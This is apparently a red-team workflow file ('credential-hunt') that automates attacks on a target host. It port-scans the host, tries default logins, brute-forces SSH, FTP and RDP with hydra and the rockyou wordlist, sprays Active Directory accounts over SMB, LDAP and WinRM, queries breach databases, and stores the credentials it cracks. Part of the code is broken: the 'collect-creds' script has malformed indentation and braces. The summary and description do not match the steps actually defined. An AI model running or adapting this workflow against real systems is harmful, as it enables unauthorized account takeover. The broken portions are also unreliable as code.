name: credential-hunt
description:
  "Multi-protocol credential hunting — brute-force login services with hydra, spray AD with netexec/kerbrute, search breach databases, and identify/crack password hashes.

  "
tags:
  - redteam
  - brute
  - credentials
  - hydra
  - spray
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target IP or hostname
      alias: t
    users_file:
      required: true
      type: string
      description: Path to username list
    passwords_file:
      type: string
      default: /usr/share/wordlists/rockyou.txt
      description: Path to password list
    domain:
      type: string
      default: ""
      description: AD domain name (for Kerberos/SMB spray)
    protocols:
      type: string
      default: ssh,ftp,smb
      description: Comma-separated protocols for hydra (ssh,ftp,smb,rdp,http-post-form)

defaults:
  store-creds: true
jobs:
  service-probe:
    name: Service Detection
    outputs:
      found_services: '{{ steps["detect-services"].outputs.found_services | default("", true) }}'
      service_count: '{{ steps["detect-services"].outputs.service_count | default("", true) }}'
      gogo_file: '{{ steps["gogo-scan"].outputs.output_file | default("", true) }}'
    steps:
      - task: naabu
        log-command: true
        name: port-scan
        with:
          target: "{{ inputs.target }}"
          top_ports: "1000"
          rate: 1000
        continue-on-error: true
      - task: gogo
        log-command: true
        name: gogo-scan
        with:
          target: "{{ inputs.target }}"
          ports: "top2,win,db"
        continue-on-error: true
      - task: nerva
        log-command: true
        name: service-fingerprint
        with:
          target: "{{ inputs.target }}"
          ports: "22,21,445,3389,3306,5432,1433,6379,27017,5900,80,443,8080"
        continue-on-error: true
      - task: httpx
        log-command: true
        name: http-probe
        with:
          target: "{{ inputs.target }}"
          status_code: true
          title: true
        continue-on-error: true
      - name: detect-services
        script: |
          ports_data = {{ ports(steps["port-scan"].outputs.typed_outputs) | tojson }}
          nerva_ports = {{ ports(steps["service-fingerprint"].outputs.typed_outputs) | tojson }}
          gogo_ports = {{ ports(steps["gogo-scan"].outputs.typed_outputs) | default([], true) | tojson }}
          service_map = {
              22: 'ssh', 21: 'ftp', 445: 'smb', 3389: 'rdp',
              3306: 'mysql', 5432: 'postgres', 1433: 'mssql',
              1521: 'oracle', 6379: 'redis', 27017: 'mongodb',
              5900: 'vnc', 8080: 'http', 443: 'https', 80: 'http'
          }

          found_services = set()
          for p in ports_data + gogo_ports:
              port = p.get('port')
              if port in service_map:
                  found_services.add(service_map[port])

          # Enrich with nerva service detection
          for p in nerva_ports:
              svc = p.get('service_name', '')
              if '/' in svc:
                  svc = svc.split('/')[0]
              if svc:
                  found_services.add(svc)

          # Enrich with gogo framework fingerprints
          for p in gogo_ports:
              svc = p.get('service_name', '')
              if svc and svc not in ('http', 'https'):
                  found_services.add(svc)

          add_outputs(found_services=','.join(sorted(found_services)), service_count=len(found_services))
          print(f"Login services detected: {', '.join(sorted(found_services))}")
  auto-brute:
    name: Zombie Default Credential Check
    outputs:
      auto_creds: '{{ steps["collect-auto"].outputs.auto_creds | default("", true) }}'
    needs:
      - service-probe
    steps:
      - task: zombie
        log-command: true
        name: zombie-defaults
        with:
          gogo: '{{ jobs["service-probe"].outputs.gogo_file }}'
          target: "{{ inputs.target }}"
          threads: 50
        store-creds: true
        continue-on-error: true
      - name: collect-auto
        script: |
          creds = {{ users(steps["zombie-defaults"].outputs.typed_outputs) | default([], true) | tojson }}
          add_outputs(auto_creds=len(creds))
          if creds:
              print(f"zombie found {len(creds)} default credentials:")
              for c in creds:
                  print(f"  [+] {c.get('username','')}:{c.get('password','')}@{c.get('host','')}")
          else:
              print("No default credentials found")
  brute-force:
    name: Hydra Brute-Force
    outputs:
      brute_hits: '{{ steps["collect-creds"].outputs.brute_hits | default("", true) }}'
      cred: '{{ steps["collect-creds"].outputs.cred | default("", true) }}'
    needs:
      - service-probe
    steps:
      - task: hydra
        log-command: true
        name: hydra-ssh
        with:
          target: "{{ inputs.target }}"
          login_file: "{{ inputs.users_file }}"
          password_file: "{{ inputs.passwords_file }}"
          service: ssh
          threads: 8
        continue-on-error: true
      - task: hydra
        log-command: true
        name: hydra-ftp
        with:
          target: "{{ inputs.target }}"
          login_file: "{{ inputs.users_file }}"
          password_file: "{{ inputs.passwords_file }}"
          service: ftp
          threads: 8
        continue-on-error: true
      - task: hydra
        log-command: true
        name: hydra-rdp
        with:
          target: "{{ inputs.target }}"
          login_file: "{{ inputs.users_file }}"
          password_file: "{{ inputs.passwords_file }}"
          service: rdp
          threads: 4
        continue-on-error: true
      - name: collect-creds
        script: |
          creds = []
          for idx in range(3):
              step_data = {{ steps | tojson }}
              typed = step_data.get(idx, {}).get('outputs', {}).get('typed_outputs', [])
              for item in typed:
                  if item.get('_type') == 'user_account':
                      creds.append(item)

          for c in creds:
          add_outputs(brute_hits=len(creds), cred=c.get('username','')}:{c.get('password',''))
          print(f"Hydra found {len(creds)} valid credentials")
          for c in creds:
              print(f"  [+] {c.get('username')}:{c.get('password')}")
  ad-spray:
    name: AD Credential Spray
    outputs:
      ad_spray_hits: '{{ steps["collect-ad-creds"].outputs.ad_spray_hits | default("", true) }}'
    needs:
      - service-probe
    if: "{{ inputs.domain }}"
    steps:
      - task: kerbrute
        log-command: true
        name: kerbrute-enum
        with:
          target: "{{ inputs.target }}"
          mode: userenum
          dc: "{{ inputs.target }}"
          domain: "{{ inputs.domain }}"
          users: "{{ inputs.users_file }}"
        continue-on-error: true
      - task: netexec
        log-command: true
        name: nxc-smb-spray
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ inputs.users_file }}"
          password: "{{ inputs.passwords_file }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
      - task: netexec
        log-command: true
        name: nxc-ldap-spray
        with:
          target: "{{ inputs.target }}"
          protocol: ldap
          username: "{{ inputs.users_file }}"
          password: "{{ inputs.passwords_file }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
      - task: netexec
        log-command: true
        name: nxc-winrm-spray
        with:
          target: "{{ inputs.target }}"
          protocol: winrm
          username: "{{ inputs.users_file }}"
          password: "{{ inputs.passwords_file }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
      - name: collect-ad-creds
        script: |
          all_creds = set()
          for idx in range(4):
              step_data = {{ steps | tojson }}
              typed = step_data.get(idx, {}).get('outputs', {}).get('typed_outputs', [])
              for item in typed:
                  u = item.get('username', '')
                  p = item.get('password', '')
                  if u:
                      all_creds.add(f"{u}:{p}")

          add_outputs(ad_spray_hits=len(all_creds))
          print(f"AD spray found {len(all_creds)} valid credentials")
  breach-search:
    name: Breach Database Search
    outputs:
      breach_count: '{{ steps["collect-breaches"].outputs.breach_count | default("", true) }}'
    steps:
      - task: h8mail
        log-command: true
        name: h8mail-search
        with:
          target: "{{ inputs.users_file }}"
        continue-on-error: true
      - name: collect-breaches
        script: |
          breach_creds = {{ users(steps["h8mail-search"].outputs.typed_outputs) | tojson }}

          add_outputs(breach_count=len(breach_creds))
          print(f"Breach database hits: {len(breach_creds)}")
  summary:
    name: Credential Hunt Summary
    needs:
      - brute-force
      - ad-spray
      - breach-search
      - auto-brute
    steps:
      - name: report
        run: |
          echo "======================================================"
          echo " CREDENTIAL HUNT COMPLETE: {{ inputs.target }}"
          echo "======================================================"
          echo ""
          echo "--- Services Detected ---"
          echo "Login services: {{ jobs['service-probe'].outputs.found_services }}"
          echo ""
          echo "--- Auto Brute (nerva→brutus) ---"
          echo "Default creds found: {{ jobs['auto-brute'].outputs.auto_creds | default('0', true) }}"
          echo ""
          echo "--- Hydra Brute-Force ---"
          echo "Valid credentials: {{ jobs['brute-force'].outputs.brute_hits }}"
          echo ""
          echo "--- AD Spray ---"
          echo "AD spray hits: {{ jobs['ad-spray'].outputs.ad_spray_hits | default('N/A (no domain)', true) }}"
          echo ""
          echo "--- Breach Search ---"
          echo "Breach hits: {{ jobs['breach-search'].outputs.breach_count }}"
        log-stdout: true
      - name: export-to-project
        script: |
          import shutil
          from pathlib import Path

          project = '{{ vars.project_path | default("", true) }}'
          if not project:
              print('No --project set, skipping file export')
          else:

              # login services
              d = '{{ vars.project_hosts }}'
              Path(d).mkdir(parents=True, exist_ok=True)
              data = '''{{ jobs['service-probe'].outputs.found_services | default('', true) }}'''.strip()
              if data:
                  (Path(d) / 'found-services.txt').write_text(data)
                  print(f'  [+] hosts/found-services.txt ({len(data.splitlines())} lines)')

              # Auto-export typed outputs
              all_typed = []
              for typed in [
                  {{ jobs['service-probe'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['brute-force'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['ad-spray'].outputs.typed_outputs | default([], true) | tojson }},
                  {{ jobs['breach-search'].outputs.typed_outputs | default([], true) | tojson }},
              ]:
                  all_typed.extend(typed)
              summaries = export_typed_outputs(project, all_typed)
              for s in summaries:
                  print(s)

              print(f'Project export complete: {project}')
        continue-on-error: true
